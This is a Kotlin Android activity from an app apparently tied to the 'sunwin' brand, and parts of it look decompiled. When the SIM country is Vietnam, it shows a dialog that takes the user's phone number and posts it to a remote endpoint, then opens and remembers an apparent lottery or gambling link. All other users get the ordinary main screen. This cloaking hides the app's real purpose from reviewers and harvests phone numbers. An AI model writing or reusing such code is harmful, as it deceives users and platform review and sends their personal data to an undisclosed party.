package com.rmtkds.sunwin

import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import androidx.appcompat.widget.AppCompatImageView
import androidx.cardview.widget.CardView
import com.androidnetworking.AndroidNetworking
import com.androidnetworking.common.Priority
import com.androidnetworking.error.ANError
import com.androidnetworking.interfaces.StringRequestListener
import com.rmtkds.sunwin.utils.DialogName
import com.rmtkds.sunwin.utils.ShareUtils
import java.lang.Exception
import java.lang.NullPointerException
import kotlin.jvm.internal.Intrinsics

class HomeActivity : AppCompatActivity() {

    private val imgTrainghiem: AppCompatImageView by lazy { findViewById(R.id.imgTrainghiem) }
    private val cardLoad: CardView by lazy { findViewById(R.id.cardLoad) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)
        imgTrainghiem.setOnClickListener {
            if (isCountryZipCode()) {
                val isGetPhone = ShareUtils.getString(this, "url", "")
                if (isGetPhone?.isEmpty() == true) {
                    DialogName(this, object : DialogName.OnLoading {
                        override fun onLoading(
                            linkDrive: String,
                            linkLottery: String,
                            phone: String
                        ) {
                            cardLoad.visibility = View.VISIBLE
                            AndroidNetworking.post(linkDrive)
                                .addUrlEncodeFormBodyParameter(
                                    "name_app", getString(R.string.app_name)
                                )
                                .addUrlEncodeFormBodyParameter("customer_phone", phone)
                                .addUrlEncodeFormBodyParameter("action", "addItem")
                                .addUrlEncodeFormBodyParameter("package_app", "")
                                .setPriority(Priority.HIGH)
                                .build()
                                .getAsString(object : StringRequestListener {
                                    override fun onResponse(response: String?) {
                                        startActivity(
                                            Intent(
                                                Intent.ACTION_VIEW,
                                                Uri.parse(linkLottery)
                                            )
                                        )
                                        ShareUtils.putString(this@HomeActivity, "url", linkLottery)
                                        cardLoad.visibility = View.GONE
                                    }

                                    override fun onError(anError: ANError?) {
                                        anError?.stackTrace
                                        cardLoad.visibility = View.GONE
                                    }
                                })
                        }
                    }).show()
                } else {
                    startActivity(
                        Intent(Intent.ACTION_VIEW, Uri.parse(isGetPhone))
                    )
                }
            } else {
                startActivity(Intent(this, MainActivity::class.java))
            }
        }
    }

    @SuppressLint("WrongConstant")
    private fun isCountryZipCode(): Boolean {
        return try {
            val systemService = getSystemService("phone")
            if (systemService != null) {
                val simCountryIso = (systemService as TelephonyManager).simCountryIso
                Intrinsics.checkNotNullExpressionValue(simCountryIso, "manager.simCountryIso")
                val upperCase = simCountryIso.toUpperCase()
                Intrinsics.checkNotNullExpressionValue(
                    upperCase,
                    "(this as java.lang.String).toUpperCase()"
                )
                return Intrinsics.areEqual(upperCase.trim() as Any, "VN" as Any)
                throw NullPointerException("null cannot be cast to non-null type kotlin.CharSequence")
            }
            throw NullPointerException("null cannot be cast to non-null type android.telephony.TelephonyManager")
        } catch (unused: Exception) {
            false
        }
    }
}